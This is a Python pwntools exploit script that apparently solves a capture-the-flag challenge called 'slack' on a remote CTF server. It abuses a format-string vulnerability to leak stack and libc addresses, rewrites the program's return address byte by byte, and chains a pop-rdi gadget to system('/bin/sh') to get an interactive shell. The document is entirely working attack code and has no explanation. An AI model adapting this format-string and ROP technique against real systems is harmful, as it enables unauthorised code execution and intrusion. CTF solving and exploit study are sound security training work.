from pwn import*
context.clear(arch = 'amd64')
context.terminal =['/mnt/c/Windows/system32/cmd.exe', '/c', 'start', 'wt.exe', '-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04', 'bash', '-c']

 
e = ELF("./slack",checksec=False)
p = remote("challs.actf.co",31500)
# p = e.debug(gdbscript="br *main+453\nc")
#p = e.process()
def send_payload(payload):
    payload += b"\x00"*(13-len(payload))
    p.sendafter(b"Your message (to increase character limit, pay $99 to upgrade to Professional): ",payload)
# reset counter dev...
send_payload(b"%25$lx")
leak = p.recvline().strip(b"\n")[-12::].decode()
leak = int(leak,16)
i = leak-0x180
set2byte = i&0xffff
log.info("counter address: 0x%x"%i)
payload = (f"%{set2byte}c%25$hn").encode()
send_payload(payload)
send_payload(b"%55$n")

def send(payload):
    # reset counter
    send_payload(b"%55$n")
    send_payload(payload)

send(b"%21$llx")
leak = p.recvline().strip(b"\n")[-12:].decode()
leak = int(leak,16)
libc_base = leak - 0x1d90 - 0x28000 
system = libc_base + 0x000000000050d60
binsh = libc_base + 0x1d8698
gadgets = libc_base + 0x000000000002a3e5 # pop rdi ; ret

log.info("libc base: 0x%x"%libc_base)
log.info("libc[system] 0x%x"%system)
log.info("/bin/sh : 0x%x"%binsh)
log.info("gadgets chain [pop rdi ; ret] : 0x%x"%gadgets)

def over_write(address,value):
    for i in range(8):
        need_write = value&0xff
        value = value >> 8
        send(f"%{(address+i)&0xffff}c%42$hn".encode())
        send(f"%{need_write}c%57$hn".encode())
        if value == 0:
            break
    log.info("Overwrited")
ret_ptr_main = i + 0x70

over_write(ret_ptr_main,gadgets)
rdi_ptr = ret_ptr_main + 8
ret_gadget_ptr= rdi_ptr + 8
over_write(rdi_ptr,binsh)
over_write(ret_gadget_ptr,gadgets+1) # ret 
over_write(ret_gadget_ptr+8,system) # system

p.sendline()
p.interactive()
